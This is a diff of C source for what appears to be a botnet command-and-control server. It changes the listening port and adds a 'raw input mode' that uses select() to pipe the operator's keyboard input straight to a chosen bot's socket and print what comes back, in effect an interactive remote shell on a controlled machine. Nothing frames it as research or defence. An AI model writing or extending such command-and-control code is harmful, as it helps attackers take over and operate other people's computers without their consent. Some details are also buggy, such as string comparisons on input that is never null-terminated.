@@ -11,6 +11,7 @@ Code has no functionality to exit cleanly.exir
 #include <poll.h>
 #include <pthread.h>
 #include <stdio.h>
+#include <sys/select.h>
 
 // Function declarations
 
@@ -33,7 +34,7 @@ static pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
 int main(void)
 {
     // Set the client connection to be the head of the list
-    connection client_con = bind_socket("127.0.0.1", 8080);
+    connection client_con = bind_socket("127.0.0.1", 8881);
     client_con.next = NULL;
 
 
@@ -298,6 +299,8 @@ void* bot_command(void* arg)
                           {
                             // Oops, our recv call failed.
                             printf("[-] Unable to recieve from %s\n", tmp->hostname);
+                            i++;
+                            continue;
                           }
 
                           recieved_data[bytes_recv] = '\0';
@@ -334,43 +337,80 @@ void* bot_command(void* arg)
                       tmp = tmp->next;
                       i++;
                     }
+                    printf("[+] Entering raw input mode with client %s\n", tmp->hostname);
+                    printf("[+] To escape raw mode, type exit\n");
+                    // This is where the ugly low-level stuff begins... Essentially the same code as the client side.
+                    // Within the while function, we shouldn't clutter the screen with lots of server generated messages
+                    int safe_exit = 0;
+                    char input[250];
+                    fd_set raw_fds;
+                    pthread_mutex_lock(&mutex);
+                    while(safe_exit == 0)
+                    {   
+                        // We'll need to start a direct line between stdin here and the client
+                        FD_ZERO(&raw_fds);
+                        FD_SET(tmp->pfds->fd, &raw_fds);
+                        FD_SET(0, &raw_fds);
 
-                    //while loop allows consecutive command message to the client
-                    while(1)
-                    {
-                        // Prompt user for input and remove trailing newline
-                        printf("[command][single][%d] Enter command: ", num);
-                        fgets(data, sizeof(data), stdin);
-                        data[strcspn(data, "\n")] = 0;
+                        // Use select to find which fd is ready to go
+                        int select_return = select(tmp->pfds->fd + 1, &raw_fds, NULL, NULL, NULL);
 
-                        if (strcmp(data,"back") == 0)
+                        if (select_return == -1)
                         {
+                            perror("[+] Unable to enter raw mode. select() returned: ");
+                            safe_exit = 1;
                             break;
                         }
                         else
-                        {    // Set lock
-                            pthread_mutex_lock(&mutex);
-
-                            send(tmp->pfds->fd, data, sizeof(data), 0);
-
-                            // Wait for a response
-                            char recieved_data[8192];
-                            int bytes_recv = recv(tmp->pfds->fd, recieved_data, 8192, 0);
-
-                            if (bytes_recv == 0)
+                        {
+                            // See if we've got something to read on our connection
+                            if (FD_ISSET(tmp->pfds->fd, &raw_fds))
                             {
-                                // Oops, our recv call failed.
-                                printf("[-] Unable to recieve from %s\n", tmp->hostname);
+                                // TODO make this variable length
+                                select_return = read(tmp->pfds->fd, input, sizeof(input));
+                                if (select_return > 0)
+                                {
+                                    if (strcmp(input,"exit") == 0)
+                                    {
+                                        safe_exit = 1;
+                                        break;
+                                    }
+                                    // Send data on to stdout
+                                    write(1, input, select_return);
+                                }
+                                else
+                                {
+                                    if (select_return < 0)
+                                    {
+                                        perror("[+] Unable to read from client.");
+                                        safe_exit = 1;
+                                        break;
+                                    }
+                                }
                             }
 
-                            recieved_data[bytes_recv] = '\0';
-                            printf("%s said: %s\n", tmp->hostname, recieved_data);
-
-
-                            // Release lock
-                            pthread_mutex_unlock(&mutex);
+                            // See if we've got something on stdin
+                            if (FD_ISSET(0, &raw_fds))
+                            {
+                                select_return = read(0, input, sizeof(input));
+                                if (select_return > 0)
+                                {
+                                    // Send data to client
+                                    write(tmp->pfds->fd, input, select_return);
+                                }
+                                else
+                                {
+                                    if (select_return < 0)
+                                    {
+                                        perror("[+] Unable to send to client.");
+                                        safe_exit = 1;
+                                        break;
+                                    }
+                                }
+                            }
                         }
                     }
+                    pthread_mutex_unlock(&mutex);
                 }
                 // Exit command control
                 else if (strcmp(data, "back") == 0)
